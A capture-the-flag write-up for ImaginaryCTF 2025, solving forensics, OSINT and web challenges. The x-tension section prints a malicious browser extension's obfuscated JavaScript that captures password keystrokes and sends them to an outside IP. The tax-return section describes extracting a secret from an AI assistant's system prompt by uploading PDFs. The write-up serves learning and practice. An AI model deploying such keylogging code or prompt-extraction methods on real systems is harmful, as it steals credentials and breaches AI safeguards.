---
title: Imaginary CTF 2025
published: 2025-10-02
tags: [Forensics]
category: Writeup CTF Challenge
draft: false
---

# Introduction

This is my write up for all of challenge I have solved.
**Note:** I'm not a native English speaker so my English is not good, please feedback to me if my wu have any mistake.

# Forensics

## Wave
>Not a steg challenge i promise
>Author: Eth007

This chall give me a wav file. I use command `exiftool` and have flag.
![image](https://hackmd.io/_uploads/BkVXobiqge.png)

**Flag: ictf{obligatory_metadata_challenge}**

## obfuscated-1
>I installed every old software known to man... The flag is the VNC password, wrapped in ictf{}.
>Author: Eth007

This chall give me folder `Users` and the request is find the VNC password.

First, I check folder `Download` and I have this:
![image](https://hackmd.io/_uploads/HJNWCZj5gg.png)

It's msi file to setup `Tightvnc`.
`TightVNC` is a free, open-source software that allows you to control a remote computer's desktop over a network using a mouse and keyboard as if you were sitting in front of it.

And when users setting the VNC password, it often save in `HKCU\SOFTWARE\TightVNC\Server` at `NTUSER.DAT`.

![image](https://hackmd.io/_uploads/SyTDJGi5el.png)

Now I use `RegistryExplorer` to view `NTUSER.DAT`.

![image](https://hackmd.io/_uploads/H1uhJfo9ex.png)

The password is `7E-9B-31-12-48-B7-C8-A8` but it have been encrypted DES. To decrypt, I use `vncpwd`(Link to download: https://github.com/themaoci/vncpwd)

![image](https://hackmd.io/_uploads/HJ6clzsqgl.png)

**Flag: ictf{Slay4U!!}**

## x-tension
>Trying to get good at something while watching youtube isn't the greatest idea...
>Author: FIREPONY57

This chall give a pcapng file. Use `wireshark` to open it.
Filter http protocol:
![image](https://hackmd.io/_uploads/Bk8UfMicgx.png)

We can see, after the user request HTTP GET `FunnyCatPicsExtension.crx`, they continue request HTTP GET to send each hex code character. Export `FunnyCatPicsExtension.crx` to check.
![image](https://hackmd.io/_uploads/rkZB7focex.png)

Use command `binwalk -e` and I have this:
![image](https://hackmd.io/_uploads/ryKPXGi5xg.png)

It's a js code.

```js=
function _0x1e75() {
  const _0x598b78 = ["940KLmqcF", "45092jwiXkN", "fromCharCode", "addEventListener", "padStart", "973KXuPbI", "28240VWxZRs", "3112764XnXYDi", "toString", "44frdLyF", "814942lZkvEV", "21078OiMojE", "getUTCMinutes", "key", "target", "927aCoiKZ", "551255yJTaff", "type", "117711JQghmv", "keydown", "charCodeAt", "length"];
  _0x1e75 = function () {
    return _0x598b78;
  };
  return _0x1e75();
}
const _0x421cd8 = _0x16e0;
function _0x16e0(_0x3b1337, _0x4a4a90) {
  const _0x1e75a5 = _0x1e75();
  return _0x16e0 = function (_0x16e0f9, _0x124fc6) {
    _0x16e0f9 = _0x16e0f9 - 172;
    let _0x20d287 = _0x1e75a5[_0x16e0f9];
    return _0x20d287;
  }, _0x16e0(_0x3b1337, _0x4a4a90);
}
(function (_0x4db7df, _0x152423) {
  const _0x419a6d = _0x16e0, _0x528a3a = _0x4db7df();
  while (true) {
    try {
      const _0x3bd5a6 = -parseInt(_0x419a6d(172)) / 1 + parseInt(_0x419a6d(185)) / 2 + parseInt(_0x419a6d(191)) / 3 + parseInt(_0x419a6d(193)) / 4 * (-parseInt(_0x419a6d(178)) / 5) + parseInt(_0x419a6d(173)) / 6 * (parseInt(_0x419a6d(189)) / 7) + parseInt(_0x419a6d(190)) / 8 * (parseInt(_0x419a6d(177)) / 9) + -parseInt(_0x419a6d(184)) / 10 * (-parseInt(_0x419a6d(180)) / 11);
      if (_0x3bd5a6 === _0x152423) break; else _0x528a3a.push(_0x528a3a.shift());
    } catch (_0x14838d) {
      _0x528a3a.push(_0x528a3a.shift());
    }
  }
}(_0x1e75, 890222));
function getKey() {
  const _0x5a2d05 = _0x16e0, _0x3733b8 = (new Date)[_0x5a2d05(174)]();
  return String[_0x5a2d05(186)](_0x3733b8 + 32);
}
function xorEncrypt(_0x2d1e8c, _0x3beac1) {
  const _0x404414 = _0x16e0;
  let _0x406d63 = "";
  for (let _0x58a85f = 0; _0x58a85f < _0x2d1e8c[_0x404414(183)]; _0x58a85f++) {
    const _0x384e0a = _0x2d1e8c[_0x404414(182)](_0x58a85f), _0x4250be = _0x3beac1.charCodeAt(0), _0x4df57c = _0x384e0a ^ _0x4250be;
    _0x406d63 += _0x4df57c[_0x404414(192)](16)[_0x404414(188)](2, "0");
  }
  return _0x406d63;
}
document[_0x421cd8(187)](_0x421cd8(181), _0x4e7994 => {
  const _0x39d3e2 = _0x421cd8, _0x260e7d = _0x4e7994[_0x39d3e2(176)];
  if (_0x260e7d[_0x39d3e2(179)] === "password") {
    const _0x2c5a17 = _0x4e7994[_0x39d3e2(175)][_0x39d3e2(183)] === 1 ? _0x4e7994[_0x39d3e2(175)] : "", _0x5e96ad = getKey(), _0x5a4007 = xorEncrypt(_0x2c5a17, _0x5e96ad), _0x3a36f2 = encodeURIComponent(_0x5a4007);
    _0x2c5a17 && fetch("http://192.9.137.137:42552/?t=" + _0x3a36f2);
  }
});
```
This code will work when we typing in input type="password", it will get the key we just typed, encrypt it and send to `http://192.9.137.137:42552`. We can see them on pcapng file.
This code encrypt the key by xor it(ASCII) with current UTC minute + 32.
![image](https://hackmd.io/_uploads/B1Ch4Mo5xl.png)

Now we extract the cipher key and decrypt it. On file pcapng, current UTC minute when the code work is 23.

![image](https://hackmd.io/_uploads/Synorzo9ll.png)

**Flag: ictf{extensions_might_just_suck}**

## thrift-store
> The frontend has gone down but the store is still open, can you buy the flag?
> thrift-store.chal.imaginaryctf.org:9090
> Author: Ciaran

This chall give me a link to connect. About des, we know this is the store but it doesn't have front end and we will buy flag by send request to this link. Next, this chall also give me a pcapng file about testing this store in local, open to view it.
![image](https://hackmd.io/_uploads/SkCb6Go5lg.png)

Now we know it use thrift protocol to operate this store. Filter thrift:
![image](https://hackmd.io/_uploads/BJ9HTMicll.png)
![image](https://hackmd.io/_uploads/Syx86zo9ll.png)

There are 4 functions to operate: 
`getInventory`: To have list menu.
`createBasket`: To create basket.
`addToBasket`: To add something to basket.
`Pay`: To pay.

If we pay not incorrect price of items in cart, it will reply me like this: `Total does not match basket total`

When we use `getInventory`, it will return struct type.

Follow to `getInvetory` request but I can't know what is flag.
![image](https://hackmd.io/_uploads/BkT50Gjclx.png)

I think I should check it in my machine.
We have a code to get Invetory:
```python3=
#!/usr/bin/env python3
# print_inventory_i64.py
import uuid, thriftpy2
from thriftpy2.rpc import make_client
from thriftpy2.protocol import TBinaryProtocolFactory
from thriftpy2.transport import TFramedTransportFactory

HOST, PORT = "thrift-store.chal.imaginaryctf.org", 9090

IDL = r"""
namespace py store_inv_i64_thrift

struct Item {
  1:string id,
  2:string name,
  3:i64    priceCents
}

struct Inventory { 1:list<Item> items }

service Store {
  Inventory getInventory(),
}
"""

def load_mod():
    p = f"/tmp/store_inv_i64_{uuid.uuid4().hex}.thrift"
    open(p, "w").write(IDL)
    return thriftpy2.load(p, module_name=f"store_inv_i64_{uuid.uuid4().hex}_thrift")

def main():
    mod = load_mod()
    c = make_client(mod.Store, HOST, PORT,
                    proto_factory=TBinaryProtocolFactory(),
                    trans_factory=TFramedTransportFactory())

    inv = c.getInventory().items
    print(f"[*] Inventory ({len(inv)} items)")
    print("{:<24}  {:<28}  {:>8}".format("id", "name", "priceCents"))
    print("-"*24 + "  " + "-"*28 + "  " + "-"*8)
    for it in inv:
        cents = getattr(it, "priceCents", None)
        print("{:<24}  {:<28}  {:>8}".format(it.id, it.name, "" if cents is None else cents))

if __name__ == "__main__":
    main()
```

And I have this:
```
[*] Inventory (16 items)
id                        name                          priceCents
------------------------  ----------------------------  --------
apple-red-delicious       Red Delicious Apple                120
banana                    Banana                              90
whole-milk-1l             Whole Milk (1L)                    250
brown-eggs-dozen          Brown Eggs (Dozen)                 450
bread-sourdough-loaf      Sourdough Bread Loaf               500
carrots-1kg               Carrots (1kg)                      300
chicken-breast-500g       Chicken Breast (500g)              750
rice-basmati-1kg          Basmati Rice (1kg)                 600
olive-oil-500ml           Extra Virgin Olive Oil (500ml)      1200
cheddar-cheese-200g       Cheddar Cheese (200g)              550
tomatoes-500g             Tomatoes (500g)                    280
onions-1kg                Onions (1kg)                       250
orange-juice-1l           Orange Juice (1L)                  400
potatoes-2kg              Potatoes (2kg)                     350
yogurt-plain-500g         Plain Yogurt (500g)                320
flag                      Flag                              9999
```

Now we know price of flag is 9999 and this is the script to buy flag.

```python3=
#!/usr/bin/env python3
# pay_flag_str.py
import sys, uuid, thriftpy2
from thriftpy2.rpc import make_client
from thriftpy2.protocol import TBinaryProtocolFactory
from thriftpy2.transport import TFramedTransportFactory

HOST, PORT = "thrift-store.chal.imaginaryctf.org", 9090
TOTAL_CENTS = 9999

IDL = r"""
namespace py store_pay_str_only_thrift

struct Basket { 1:string id }
exception X1 { 1:string message }
exception X2 { 1:string message }

service Store {
  Basket createBasket() throws (1:X1 x1, 2:X2 x2),
  void   addToBasket(1:string basketId, 2:string item) throws (1:X1 x1, 2:X2 x2),
  string pay(1:string basketId, 2:i64 totalCents)      throws (1:X1 x1, 2:X2 x2)
}
"""

def load_mod():
    p = f"/tmp/store_pay_str_only_{uuid.uuid4().hex}.thrift"
    open(p, "w").write(IDL)
    return thriftpy2.load(p, module_name=f"store_pay_str_only_{uuid.uuid4().hex}_thrift")

def main():
    mod = load_mod()
    c = make_client(mod.Store, HOST, PORT,
                    proto_factory=TBinaryProtocolFactory(),
                    trans_factory=TFramedTransportFactory())

    bid = c.createBasket().id
    c.addToBasket(bid, "flag")
    flag = c.pay(bid, TOTAL_CENTS)

if __name__ == "__main__":
    main()
```

When I run this code, I open wireshark to capture the traffic and have flag.

![image](https://hackmd.io/_uploads/B13fHQicxl.png)

**Flag: ictf{l1k3_gRPC_bUt_l3ss_g0ogly}**

# Misc

Sanity check and discord are free flag so I don't write it here.

## significant
> The signpost knows where it is at all times. It knows this because it knows where it isn't, by subtracting where it is, from where it isn't, or where it isn't, from where it is, whichever is greater. Consequently, the position where it is, is now the position that it wasn't, and it follows that the position where it was, is now the position that it isn't.
Please find the coordinates (lat, long) of this signpost to the nearest 3 decimals, separated by a comma with no space. Ensure that you are rounding and not truncating before you make a ticket. Example flag: ictf{-12.345,6.789}
Author: puzzler7

This is a OSINT challenge. We have this image.
![significant](https://hackmd.io/_uploads/HJevv7i5xl.jpg)

Now we will find where is it.
![image](https://hackmd.io/_uploads/Hk-9vXocgg.png)

It's `sanfrancisco's sister citites`.

![image](https://hackmd.io/_uploads/rkD0YQiclg.png)
![image](https://hackmd.io/_uploads/HkeN5Qj9xx.png)

**Flag: ictf{37.784,-122.408}**

## zoom
> Where in the world is the red dot?
Format: ictf{lat,long} rounded to three decimal places. example: ictf{12.345,-67.890}
Author: Eth007

Next, OSINT challenge again. We have this image.
![beavertail](https://hackmd.io/_uploads/By9Z27sqex.png)

I paste it to chatgpt and know it is `Ottawa_Macdonald–Cartier_International_Airport`
![image](https://hackmd.io/_uploads/ryNJ67oqxl.png)

**Flag: ictf{45.282, -75.795}**

### tax-return
> Here is a helpful ai tax return assistant. When I made it, I put a super secret flag into the system prompt. You will never find it! http://tax-return.chal.imaginaryctf.org
> Author: cleverbear57

This chall is about AI prompt injection. 
![image](https://hackmd.io/_uploads/ryL9kEs9gg.png)

We only push pdf file to this web.

When I push a pdf with content tell AI to give me flag, AI will reply me like this:
![image](https://hackmd.io/_uploads/SkHgxVo5ge.png)

But when I push a pdf about blog and do not pose a problem for AI to solve, it will reply me like this:
![image](https://hackmd.io/_uploads/HkxH-Ei5ge.png)

It will tell `I can't give you anything about the secret ictf{h0w_d1d_y0u_tr1ck_my_a1_@ss1st@nt?}`.

**Flag: ictf{h0w_d1d_y0u_tr1ck_my_a1_@ss1st@nt?}**

# Web

## certificate
>As a thank you for playing our CTF, we're giving out participation certificates! Each one comes with a custom flag, but I bet you can't get the flag belonging to Eth007!
https://eth007.me/cert/ 
author: Eth007

This is the website interface:
![image](https://hackmd.io/_uploads/r1x0WVjcex.png)

Press F12 and I have this:
![image](https://hackmd.io/_uploads/HyNfzVjqxl.png)

```html=

const nameInput=document.getElementById('name');
const affInput=document.getElementById('affiliation');
const dateInput=document.getElementById('date');
const styleSelect=document.getElementById('style');
const svgHolder=document.getElementById('svgHolder');

const paperW=1122, paperH=794;
const logoUrl = 'https://2025.imaginaryctf.org/img/logo.png';

(function(){const d=new Date();dateInput.value=d.toISOString().slice(0,10)})();

function getStyleColors(style){
  if(style==='modern') return {bg:'#f7fff9', primary:'#0f766e', accent:'#0ea5a4', text:'#073040'};
  if(style==='dark') return {bg:'#0b1220', primary:'#0f1724', accent:'#8b5cf6', text:'#e6eef8'};
  return {bg:'#fbfdff', primary:'#eaf4ff', accent:'#1f6feb', text:'#07203a'};
}
function escapeXml(s){return String(s||"").replace(/[&<>'"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;","'":"&apos;",'"':"&quot;"}[c]))}

function customHash(str){
  let h = 1337;
  for (let i=0;i<str.length;i++){
    h = (h * 31 + str.charCodeAt(i)) ^ (h >>> 7);
    h = h >>> 0; // force unsigned
  }
  return h.toString(16);
}

function makeFlag(name){
  const clean = name.trim() || "anon";
  const h = customHash(clean);
  return `ictf{${h}}`;
}

function buildCertificateSVG({participant,affiliation,date,styleKey}) {
  const colors = getStyleColors(styleKey);
  participant = escapeXml(participant||"—");
  affiliation = escapeXml(affiliation||"");
  date = escapeXml(date||"");
  return `
<svg xmlns="http://www.w3.org/2000/svg" width="${paperW}" height="${paperH}" viewBox="0 0 ${paperW} ${paperH}">
  <desc>${makeFlag(participant)}</desc>
  <rect width="100%" height="100%" fill="${colors.bg}"/>
  <rect x="40" y="40" width="${paperW-80}" height="${paperH-80}" rx="18" fill="${colors.primary}" opacity="0.08"/>
  <rect x="60" y="60" width="${paperW-120}" height="${paperH-120}" rx="14" fill="#ffffff"/>
  <image href="${logoUrl}" x="${paperW/2-100}" y="80" width="200" height="200" preserveAspectRatio="xMidYMid meet"/>
  <text x="${paperW/2}" y="340" text-anchor="middle" font-family="Georgia, serif" font-size="34" fill="${colors.text}">Certificate of Participation</text>
  <text x="${paperW/2}" y="380" text-anchor="middle" font-size="16" fill="${colors.text}" opacity="0.7">This certifies that</text>
  <text x="${paperW/2}" y="460" text-anchor="middle" font-size="48" font-weight="700" font-family="'Segoe UI',sans-serif" fill="${colors.text}">${participant}</text>
  <text x="${paperW/2}" y="505" text-anchor="middle" font-size="18" fill="${colors.text}" opacity="0.7">${affiliation}</text>
  <text x="${paperW/2}" y="560" text-anchor="middle" font-family="Georgia, serif" font-size="16" fill="${colors.text}" opacity="0.8">
    For popping shells, cracking codes, and capturing flags in ImaginaryCTF 2025.
  </text>
  <text x="${paperW/2}" y="620" text-anchor="middle" font-family="Roboto, sans-serif" font-size="14" fill="${colors.text}" opacity="0.7">Date: ${date}</text>
</svg>`.trim();
}

function renderPreview(){
  var name = nameInput.value.trim();
  if (name == "Eth007") {
    name = "REDACTED"
  } 
  const svg = buildCertificateSVG({
    participant: name || "Participant Name",
    affiliation: affInput.value.trim() || "Participant",
    date: dateInput.value,
    styleKey: styleSelect.value
  });
  svgHolder.innerHTML = svg;
  svgHolder.dataset.currentSvg = svg;
}

function downloadSvgFile(filename, svgText){
  const blob = new Blob([svgText], {type: "image/svg+xml;charset=utf-8"});
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(()=>URL.revokeObjectURL(url), 1000);
}

document.getElementById('generate').addEventListener('click', e=>{
  e.preventDefault();
  renderPreview();
});
document.getElementById('downloadSvg').addEventListener('click', e=>{
  e.preventDefault();
  const svg = svgHolder.dataset.currentSvg;
  const nameFile = (nameInput.value.trim() || 'certificate').replace(/\s+/g,'_').toLowerCase();
  downloadSvgFile(`${nameFile}_imaginaryctf2025.svg`, svg);
});
document.getElementById('printBtn').addEventListener('click', e=>{
  e.preventDefault();
  window.print();
});

renderPreview();
```

With each name we enter, it will hash each flag. But when the name is `Eth007` it will change to `REDACTED` so we can have real flag from `Eth007`.

This is functions hash:
```html=
function customHash(str){
  let h = 1337;
  for (let i=0;i<str.length;i++){
    h = (h * 31 + str.charCodeAt(i)) ^ (h >>> 7);
    h = h >>> 0; 
  }
  return h.toString(16); 
}
function makeFlag(name){
  const clean = name.trim() || "anon";
  const h = customHash(clean);
  return `ictf{${h}}`;
}
```
This is the first when we not enter the name.
![image](https://hackmd.io/_uploads/HkkLNNo9gx.png)

Now we will use this code to hash if name = "Eth007"

**FLag: ictf{7b4b3965}**